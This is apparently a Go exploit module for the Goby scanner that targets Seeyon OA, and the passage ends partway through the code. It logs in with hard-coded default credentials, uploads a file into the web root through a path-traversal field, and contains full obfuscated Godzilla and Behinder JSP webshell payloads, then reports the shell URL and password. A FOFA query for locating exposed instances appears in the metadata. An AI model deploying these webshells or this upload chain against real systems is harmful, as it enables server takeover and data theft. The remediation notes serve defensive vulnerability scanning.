package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Seeyon OA Default Password Vulnerability",
    "Description": "<p>Seeyon OA is a collaborative management software developed by China Zhiyuan Internet Company.</p><p>Seeyon OA has a default password vulnerability. An attacker can control the entire platform through audit-admin:123456/seeyon-guest:123456 and use administrator privileges to operate core functions.</p>",
    "Product": "SEEYON-OA",
    "Homepage": "https://www.seeyon.com/",
    "DisclosureDate": "2023-02-22",
    "Author": "Sanyuee1@163.com",
    "FofaQuery": "body=\"/seeyon/USER-DATA/IMAGES/LOGIN/login.gif\" || title=\"用友致远A\" || (body=\"/yyoa/\" && body!=\"本站内容均采集于\" && body!=\"getFirstU8Accid\" && (body=\"/U8-OA/css/\" || title=\"致远\" || body=\"seeyonoa\" || body=\"CheckLogin\")) || header=\"path=/yyoa\" || server==\"SY8044\" || (body=\"A6-V5企业版\" && body=\"seeyon\" && body=\"seeyonProductId\") || (body=\"/seeyon/common/\" && body=\"var _ctxpath = '/seeyon'\") || (body=\"A8-V5企业版\" && body=\"/seeyon/\") || (title=\"致远A8\" && (body=\"seeyonProductId\" || body=\"/seeyon/\")) || body=\"<meta http-equiv=\\\"Refresh\\\" content=\\\"0;url=/seeyon/main.do?method=index\\\">\" || (header=\"SY8045\" && (header=\"Path=/seeyon\" || body=\"var seeyonProductId\" || title=\"A8\" || body=\"2Fseeyon%2Findex.jsp'</script>\")) || banner=\"Server: SY8044\" || (body=\"parent.frame_A8\" && (header=\"Path=/seeyon\" || header=\"loginPageURL\" || body=\"/seeyon/genericController.do?ViewPage=apps/autoinstall/downLoadIESet\"))",
    "GobyQuery": "body=\"/seeyon/USER-DATA/IMAGES/LOGIN/login.gif\" || title=\"用友致远A\" || (body=\"/yyoa/\" && body!=\"本站内容均采集于\" && body!=\"getFirstU8Accid\" && (body=\"/U8-OA/css/\" || title=\"致远\" || body=\"seeyonoa\" || body=\"CheckLogin\")) || header=\"path=/yyoa\" || server==\"SY8044\" || (body=\"A6-V5企业版\" && body=\"seeyon\" && body=\"seeyonProductId\") || (body=\"/seeyon/common/\" && body=\"var _ctxpath = '/seeyon'\") || (body=\"A8-V5企业版\" && body=\"/seeyon/\") || (title=\"致远A8\" && (body=\"seeyonProductId\" || body=\"/seeyon/\")) || body=\"<meta http-equiv=\\\"Refresh\\\" content=\\\"0;url=/seeyon/main.do?method=index\\\">\" || (header=\"SY8045\" && (header=\"Path=/seeyon\" || body=\"var seeyonProductId\" || title=\"A8\" || body=\"2Fseeyon%2Findex.jsp'</script>\")) || banner=\"Server: SY8044\" || (body=\"parent.frame_A8\" && (header=\"Path=/seeyon\" || header=\"loginPageURL\" || body=\"/seeyon/genericController.do?ViewPage=apps/autoinstall/downLoadIESet\"))",
    "Level": "2",
    "Impact": "<p>Attackers can control the whole platform through the default password vulnerability, and use the administrator rights to operate the core functions, which is extremely harmful to users.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, special characters, and more than 8 digits.</p><p>2. If not necessary, the public network is prohibited from accessing the system.</p><p>3. Set access policy and whitelist access through firewall and other security devices.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "login,webshell",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "test98765X.jsp",
            "show": "webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(123); %>",
            "show": "webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload",
        "Default Password"
    ],
    "VulType": [
        "File Upload",
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "致远 OA 默认口令漏洞",
            "Product": "致远互联-OA",
            "Description": "<p>致远 OA 是一款协同管理软件，致远OA由中国致远互联公司开发。</p><p>致远 OA 存在默认口令漏洞，攻击者可通过 audit-admin:123456/seeyon-guest:123456 控制整个平台，使用管理员权限操作核心的功能。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能，对用户极具危害。<br></p>",
            "VulType": [
                "默认口令",
                "文件上传"
            ],
            "Tags": [
                "默认口令",
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Seeyon OA Default Password Vulnerability",
            "Product": "SEEYON-OA",
            "Description": "<p>Seeyon OA is a collaborative management software developed by China Zhiyuan Internet Company.</p><p>Seeyon OA has a default password vulnerability. An attacker can control the entire platform through audit-admin:123456/seeyon-guest:123456 and use administrator privileges to operate core functions.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, special characters, and more than 8 digits.</p><p>2. If not necessary, the public network is prohibited from accessing the system.</p><p>3. Set access policy and whitelist access through firewall and other security devices.</p>",
            "Impact": "<p>Attackers can control the whole platform through the default password vulnerability, and use the administrator rights to operate the core functions, which is extremely harmful to users.<br></p>",
            "VulType": [
                "File Upload",
                "Default Password"
            ],
            "Tags": [
                "File Upload",
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-08-11",
    "PocId": "10899"
}`

	loginFlagXavHdasdasdfkajf := func(hostInfo *httpclient.FixUrl) (string, error) {
		for _, username := range []string{`audit-admin`, `seeyon-guest`} {
			uri := `/seeyon/rest/authentication/ucpcLogin?login_username=` + username + `&login_password=123456&ticket=`
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.FollowRedirect = false
			cfg.VerifyTls = false
			resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
			if err != nil {
				return "", err
			}
			if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "\"LoginOK\":\"ok\",") {
				return resp.Cookie, nil
			}
		}
		return "", errors.New("漏洞利用失败")
	}

	uploadFilesiadhjn := func(cookie, filename, fileContent string, hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		uploadRequestConfig := httpclient.NewPostRequestConfig("/seeyon/fileUpload.do?method=processUploadForH5")
		uploadRequestConfig.VerifyTls = false
		uploadRequestConfig.FollowRedirect = false
		uploadRequestConfig.Header.Store("Content-Type", " multipart/form-data; boundary=----WebKitFormBoundaryrotjXQyC2pVyCoKU")
		uploadRequestConfig.Header.Store("Cookie", cookie)
		uploadRequestConfig.Data = fmt.Sprintf("------WebKitFormBoundaryrotjXQyC2pVyCoKU\r\nContent-Disposition: form-data; name=\"file\"; filename=\"1.zip\"\r\nContent-Type: application/octet-stream\r\n\r\n%s\r\n------WebKitFormBoundaryrotjXQyC2pVyCoKU\r\nContent-Disposition: form-data; name=\"lastModifiedDate\"\r\n\r\n../../../../ApacheJetspeed/webapps/ROOT/%s\r\n------WebKitFormBoundaryrotjXQyC2pVyCoKU\r\nContent-Disposition: form-data; name=\"fileSize\"\r\n\r\n9999\r\n------WebKitFormBoundaryrotjXQyC2pVyCoKU--", fileContent, filename)
		_, err := httpclient.DoHttpRequest(hostInfo, uploadRequestConfig)
		if err != nil {
			return nil, err
		}
		checkRequestConfig := httpclient.NewGetRequestConfig("/" + filename)
		checkRequestConfig.VerifyTls = false
		checkRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, checkRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cookie, _ := loginFlagXavHdasdasdfkajf(u)
			return len(cookie) > 0
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType != "webshell" && attackType != "login" {
				expResult.Output = `未知的利用方式`
				return expResult
			}
			cookie, err := loginFlagXavHdasdasdfkajf(expResult.HostInfo)
			if err != nil {
				expResult.Output = err.Error()
			} else if len(cookie) > 0 {
				expResult.Success = true
				expResult.Output += "Cookie:" + cookie
			} else {
				expResult.Output = `漏洞利用失败`
			}
			var content string
			webshell := goutils.B2S(ss.Params["webshell"])
			filename := goutils.RandomHexString(6) + ".jsp"
			if attackType == "webshell" {
				if webshell == "godzilla" {
					content = `<%! \u0053\u0074\u0072\u0069\u006e\u0067 \u0078\u0063="\u0033\u0063\u0036\u0065\u0030\u0062\u0038\u0061\u0039\u0063\u0031\u0035\u0032\u0032\u0034\u0061"; \u0053\u0074\u0072\u0069\u006e\u0067 \u0070\u0061\u0073\u0073="\u0070\u0061\u0073\u0073"; \u0053\u0074\u0072\u0069\u006e\u0067 \u006d\u0064\u0035=\u006d\u0064\u0035(\u0070\u0061\u0073\u0073+\u0078\u0063); \u0063\u006c\u0061\u0073\u0073 \u0058 \u0065\u0078\u0074\u0065\u006e\u0064\u0073 \u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072{\u0070\u0075\u0062\u006c\u0069\u0063 \u0058(\u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 \u007a){\u0073\u0075\u0070\u0065\u0072(\u007a);}\u0070\u0075\u0062\u006c\u0069\u0063 \u0043\u006c\u0061\u0073\u0073 \u0051(\u0062\u0079\u0074\u0065[] \u0063\u0062){\u0072\u0065\u0074\u0075\u0072\u006e \u0073\u0075\u0070\u0065\u0072.\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073(\u0063\u0062, \u0030, \u0063\u0062.\u006c\u0065\u006e\u0067\u0074\u0068);} }\u0070\u0075\u0062\u006c\u0069\u0063 \u0062\u0079\u0074\u0065[] \u0078(\u0062\u0079\u0074\u0065[] \u0073,\u0062\u006f\u006f\u006c\u0065\u0061\u006e \u006d){ \u0074\u0072\u0079{\u006a\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.\u0043\u0069\u0070\u0068\u0065\u0072 \u0063=\u006a\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.\u0043\u0069\u0070\u0068\u0065\u0072.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065("\u0041\u0045\u0053");\u0063.\u0069\u006e\u0069\u0074(\u006d?\u0031:\u0032,\u006e\u0065\u0077 \u006a\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.\u0073\u0070\u0065\u0063.\u0053\u0065\u0063\u0072\u0065\u0074\u004b\u0065\u0079\u0053\u0070\u0065\u0063(\u0078\u0063.\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073(),"\u0041\u0045\u0053"));\u0072\u0065\u0074\u0075\u0072\u006e \u0063.\u0064\u006f\u0046\u0069\u006e\u0061\u006c(\u0073); }\u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065){\u0072\u0065\u0074\u0075\u0072\u006e \u006e\u0075\u006c\u006c; }} \u0070\u0075\u0062\u006c\u0069\u0063 \u0073\u0074\u0061\u0074\u0069\u0063 \u0053\u0074\u0072\u0069\u006e\u0067 \u006d\u0064\u0035(\u0053\u0074\u0072\u0069\u006e\u0067 \u0073) {\u0053\u0074\u0072\u0069\u006e\u0067 \u0072\u0065\u0074 = \u006e\u0075\u006c\u006c;\u0074\u0072\u0079 {\u006a\u0061\u0076\u0061.\u0073\u0065\u0063\u0075\u0072\u0069\u0074\u0079.\u004d\u0065\u0073\u0073\u0061\u0067\u0065\u0044\u0069\u0067\u0065\u0073\u0074 \u006d;\u006d = \u006a\u0061\u0076\u0061.\u0073\u0065\u0063\u0075\u0072\u0069\u0074\u0079.\u004d\u0065\u0073\u0073\u0061\u0067\u0065\u0044\u0069\u0067\u0065\u0073\u0074.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065("\u004d\u0044\u0035");\u006d.\u0075\u0070\u0064\u0061\u0074\u0065(\u0073.\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073(), \u0030, \u0073.\u006c\u0065\u006e\u0067\u0074\u0068());\u0072\u0065\u0074 = \u006e\u0065\u0077 \u006a\u0061\u0076\u0061.\u006d\u0061\u0074\u0068.\u0042\u0069\u0067\u0049\u006e\u0074\u0065\u0067\u0065\u0072(\u0031, \u006d.\u0064\u0069\u0067\u0065\u0073\u0074()).\u0074\u006f\u0053\u0074\u0072\u0069\u006e\u0067(\u0031\u0036).\u0074\u006f\u0055\u0070\u0070\u0065\u0072\u0043\u0061\u0073\u0065();} \u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065) {}\u0072\u0065\u0074\u0075\u0072\u006e \u0072\u0065\u0074; } \u0070\u0075\u0062\u006c\u0069\u0063 \u0073\u0074\u0061\u0074\u0069\u0063 \u0053\u0074\u0072\u0069\u006e\u0067 \u0062\u0061\u0073\u0065\u0036\u0034\u0045\u006e\u0063\u006f\u0064\u0065(\u0062\u0079\u0074\u0065[] \u0062\u0073) \u0074\u0068\u0072\u006f\u0077\u0073 \u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e {\u0043\u006c\u0061\u0073\u0073 \u0062\u0061\u0073\u0065\u0036\u0034;\u0053\u0074\u0072\u0069\u006e\u0067 \u0076\u0061\u006c\u0075\u0065 = \u006e\u0075\u006c\u006c;\u0074\u0072\u0079 {\u0062\u0061\u0073\u0065\u0036\u0034=\u0043\u006c\u0061\u0073\u0073.\u0066\u006f\u0072\u004e\u0061\u006d\u0065("\u006a\u0061\u0076\u0061.\u0075\u0074\u0069\u006c.\u0042\u0061\u0073\u0065\u0036\u0034");\u004f\u0062\u006a\u0065\u0063\u0074 \u0045\u006e\u0063\u006f\u0064\u0065\u0072 = \u0062\u0061\u0073\u0065\u0036\u0034.\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0067\u0065\u0074\u0045\u006e\u0063\u006f\u0064\u0065\u0072", \u006e\u0075\u006c\u006c).\u0069\u006e\u0076\u006f\u006b\u0065(\u0062\u0061\u0073\u0065\u0036\u0034, \u006e\u0075\u006c\u006c);\u0076\u0061\u006c\u0075\u0065 = (\u0053\u0074\u0072\u0069\u006e\u0067)\u0045\u006e\u0063\u006f\u0064\u0065\u0072.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0065\u006e\u0063\u006f\u0064\u0065\u0054\u006f\u0053\u0074\u0072\u0069\u006e\u0067", \u006e\u0065\u0077 \u0043\u006c\u0061\u0073\u0073[] { \u0062\u0079\u0074\u0065[].\u0063\u006c\u0061\u0073\u0073 }).\u0069\u006e\u0076\u006f\u006b\u0065(\u0045\u006e\u0063\u006f\u0064\u0065\u0072, \u006e\u0065\u0077 \u004f\u0062\u006a\u0065\u0063\u0074[] { \u0062\u0073 });} \u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065) {\u0074\u0072\u0079 { \u0062\u0061\u0073\u0065\u0036\u0034=\u0043\u006c\u0061\u0073\u0073.\u0066\u006f\u0072\u004e\u0061\u006d\u0065("\u0073\u0075\u006e.\u006d\u0069\u0073\u0063.\u0042\u0041\u0053\u0045\u0036\u0034\u0045\u006e\u0063\u006f\u0064\u0065\u0072"); \u004f\u0062\u006a\u0065\u0063\u0074 \u0045\u006e\u0063\u006f\u0064\u0065\u0072 = \u0062\u0061\u0073\u0065\u0036\u0034.\u006e\u0065\u0077\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065(); \u0076\u0061\u006c\u0075\u0065 = (\u0053\u0074\u0072\u0069\u006e\u0067)\u0045\u006e\u0063\u006f\u0064\u0065\u0072.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0065\u006e\u0063\u006f\u0064\u0065", \u006e\u0065\u0077 \u0043\u006c\u0061\u0073\u0073[] { \u0062\u0079\u0074\u0065[].\u0063\u006c\u0061\u0073\u0073 }).\u0069\u006e\u0076\u006f\u006b\u0065(\u0045\u006e\u0063\u006f\u0064\u0065\u0072, \u006e\u0065\u0077 \u004f\u0062\u006a\u0065\u0063\u0074[] { \u0062\u0073 });} \u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065\u0032) {}}\u0072\u0065\u0074\u0075\u0072\u006e \u0076\u0061\u006c\u0075\u0065; } \u0070\u0075\u0062\u006c\u0069\u0063 \u0073\u0074\u0061\u0074\u0069\u0063 \u0062\u0079\u0074\u0065[] \u0062\u0061\u0073\u0065\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065(\u0053\u0074\u0072\u0069\u006e\u0067 \u0062\u0073) \u0074\u0068\u0072\u006f\u0077\u0073 \u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e {\u0043\u006c\u0061\u0073\u0073 \u0062\u0061\u0073\u0065\u0036\u0034;\u0062\u0079\u0074\u0065[] \u0076\u0061\u006c\u0075\u0065 = \u006e\u0075\u006c\u006c;\u0074\u0072\u0079 {\u0062\u0061\u0073\u0065\u0036\u0034=\u0043\u006c\u0061\u0073\u0073.\u0066\u006f\u0072\u004e\u0061\u006d\u0065("\u006a\u0061\u0076\u0061.\u0075\u0074\u0069\u006c.\u0042\u0061\u0073\u0065\u0036\u0034");\u004f\u0062\u006a\u0065\u0063\u0074 \u0064\u0065\u0063\u006f\u0064\u0065\u0072 = \u0062\u0061\u0073\u0065\u0036\u0034.\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072", \u006e\u0075\u006c\u006c).\u0069\u006e\u0076\u006f\u006b\u0065(\u0062\u0061\u0073\u0065\u0036\u0034, \u006e\u0075\u006c\u006c);\u0076\u0061\u006c\u0075\u0065 = (\u0062\u0079\u0074\u0065[])\u0064\u0065\u0063\u006f\u0064\u0065\u0072.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0064\u0065\u0063\u006f\u0064\u0065", \u006e\u0065\u0077 \u0043\u006c\u0061\u0073\u0073[] { \u0053\u0074\u0072\u0069\u006e\u0067.\u0063\u006c\u0061\u0073\u0073 }).\u0069\u006e\u0076\u006f\u006b\u0065(\u0064\u0065\u0063\u006f\u0064\u0065\u0072, \u006e\u0065\u0077 \u004f\u0062\u006a\u0065\u0063\u0074[] { \u0062\u0073 });} \u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065) {\u0074\u0072\u0079 { \u0062\u0061\u0073\u0065\u0036\u0034=\u0043\u006c\u0061\u0073\u0073.\u0066\u006f\u0072\u004e\u0061\u006d\u0065("\u0073\u0075\u006e.\u006d\u0069\u0073\u0063.\u0042\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072"); \u004f\u0062\u006a\u0065\u0063\u0074 \u0064\u0065\u0063\u006f\u0064\u0065\u0072 = \u0062\u0061\u0073\u0065\u0036\u0034.\u006e\u0065\u0077\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065(); \u0076\u0061\u006c\u0075\u0065 = (\u0062\u0079\u0074\u0065[])\u0064\u0065\u0063\u006f\u0064\u0065\u0072.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064("\u0064\u0065\u0063\u006f\u0064\u0065\u0042\u0075\u0066\u0066\u0065\u0072", \u006e\u0065\u0077 \u0043\u006c\u0061\u0073\u0073[] { \u0053\u0074\u0072\u0069\u006e\u0067.\u0063\u006c\u0061\u0073\u0073 }).\u0069\u006e\u0076\u006f\u006b\u0065(\u0064\u0065\u0063\u006f\u0064\u0065\u0072, \u006e\u0065\u0077 \u004f\u0062\u006a\u0065\u0063\u0074[] { \u0062\u0073 });} \u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065\u0032) {}}\u0072\u0065\u0074\u0075\u0072\u006e \u0076\u0061\u006c\u0075\u0065; }%><%\u0074\u0072\u0079{\u0062\u0079\u0074\u0065[] \u0064\u0061\u0074\u0061=\u0062\u0061\u0073\u0065\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065(\u0072\u0065\u0071\u0075\u0065\u0073\u0074.\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072(\u0070\u0061\u0073\u0073));\u0064\u0061\u0074\u0061=\u0078(\u0064\u0061\u0074\u0061, \u0066\u0061\u006c\u0073\u0065);\u0069\u0066 (\u0073\u0065\u0073\u0073\u0069\u006f\u006e.\u0067\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065("\u0070\u0061\u0079\u006c\u006f\u0061\u0064")==\u006e\u0075\u006c\u006c){\u0073\u0065\u0073\u0073\u0069\u006f\u006e.\u0073\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065("\u0070\u0061\u0079\u006c\u006f\u0061\u0064",\u006e\u0065\u0077 \u0058(\u0074\u0068\u0069\u0073.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072()).\u0051(\u0064\u0061\u0074\u0061));}\u0065\u006c\u0073\u0065{\u0072\u0065\u0071\u0075\u0065\u0073\u0074.\u0073\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065("\u0070\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0073",\u0064\u0061\u0074\u0061);\u006a\u0061\u0076\u0061.\u0069\u006f.\u0042\u0079\u0074\u0065\u0041\u0072\u0072\u0061\u0079\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d \u0061\u0072\u0072\u004f\u0075\u0074=\u006e\u0065\u0077 \u006a\u0061\u0076\u0061.\u0069\u006f.\u0042\u0079\u0074\u0065\u0041\u0072\u0072\u0061\u0079\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d();\u004f\u0062\u006a\u0065\u0063\u0074 \u0066=((\u0043\u006c\u0061\u0073\u0073)\u0073\u0065\u0073\u0073\u0069\u006f\u006e.\u0067\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065("\u0070\u0061\u0079\u006c\u006f\u0061\u0064")).\u006e\u0065\u0077\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065();\u0066.\u0065\u0071\u0075\u0061\u006c\u0073(\u0061\u0072\u0072\u004f\u0075\u0074);\u0066.\u0065\u0071\u0075\u0061\u006c\u0073(\u0070\u0061\u0067\u0065\u0043\u006f\u006e\u0074\u0065\u0078\u0074);\u0072\u0065\u0073\u0070\u006f\u006e\u0073\u0065.\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072().\u0077\u0072\u0069\u0074\u0065(\u006d\u0064\u0035.\u0073\u0075\u0062\u0073\u0074\u0072\u0069\u006e\u0067(\u0030,\u0031\u0036));\u0066.\u0074\u006f\u0053\u0074\u0072\u0069\u006e\u0067();\u0072\u0065\u0073\u0070\u006f\u006e\u0073\u0065.\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072().\u0077\u0072\u0069\u0074\u0065(\u0062\u0061\u0073\u0065\u0036\u0034\u0045\u006e\u0063\u006f\u0064\u0065(\u0078(\u0061\u0072\u0072\u004f\u0075\u0074.\u0074\u006f\u0042\u0079\u0074\u0065\u0041\u0072\u0072\u0061\u0079(), \u0074\u0072\u0075\u0065)));\u0072\u0065\u0073\u0070\u006f\u006e\u0073\u0065.\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072().\u0077\u0072\u0069\u0074\u0065(\u006d\u0064\u0035.\u0073\u0075\u0062\u0073\u0074\u0072\u0069\u006e\u0067(\u0031\u0036));} }\u0063\u0061\u0074\u0063\u0068 (\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e \u0065){}
%>`
				} else if webshell == "behinder" {
					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
					// unicode 编码
					content = `<%@page import="\u006a\u0061\u0076\u0061.\u0075\u0074\u0069\u006c.*,\u006a\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.*,\u006a\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.\u0073\u0070\u0065\u0063.*"%><%!\u0063\u006c\u0061\u0073\u0073 \u0055 \u0065\u0078\u0074\u0065\u006e\u0064\u0073 \u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072{\u0055(\u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 \u0063){\u0073\u0075\u0070\u0065\u0072(\u0063);}\u0070\u0075\u0062\u006c\u0069\u0063 \u0043\u006c\u0061\u0073\u0073 \u0067(\u0062\u0079\u0074\u0065 []\u0062){\u0072\u0065\u0074\u0075\u0072\u006e \u0073\u0075\u0070\u0065\u0072.\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073(\u0062,\u0030,\u0062.\u006c\u0065\u006e\u0067\u0074\u0068);}}%><%\u0069\u0066 (\u0072\u0065\u0071\u0075\u0065\u0073\u0074.\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064().\u0065\u0071\u0075\u0061\u006c\u0073("\u0050\u004f\u0053\u0054")){\u0053\u0074\u0072\u0069\u006e\u0067 \u006b="\u0065\u0034\u0035\u0065\u0033\u0032\u0039\u0066\u0065\u0062\u0035\u0064\u0039\u0032\u0035\u0062";\u0073\u0065\u0073\u0073\u0069\u006f\u006e.\u0070\u0075\u0074\u0056\u0061\u006c\u0075\u0065("\u0075",\u006b);\u0043\u0069\u0070\u0068\u0065\u0072 \u0063=\u0043\u0069\u0070\u0068\u0065\u0072.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065("\u0041\u0045\u0053");\u0063.\u0069\u006e\u0069\u0074(\u0032,\u006e\u0065\u0077 \u0053\u0065\u0063\u0072\u0065\u0074\u004b\u0065\u0079\u0053\u0070\u0065\u0063(\u006b.\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073(),"\u0041\u0045\u0053"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				} else {
					filename = goutils.B2S(ss.Params["filename"])
					content = goutils.B2S(ss.Params["content"])
				}
			} else if attackType == "login" {
				return expResult
			}
			resp, err := uploadFilesiadhjn(cookie, filename, content, expResult.HostInfo)
			if resp != nil && resp.StatusCode == 200 {
				expResult.Success = true
				expResult.Output = fmt.Sprintf("WebShell URL: %s\n", expResult.HostInfo.FixedHostInfo+"/"+filename)
				if webshell == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v4.0\n"
					expResult.Output += "Webshell type: JSP"
				} else if webshell == "godzilla" {
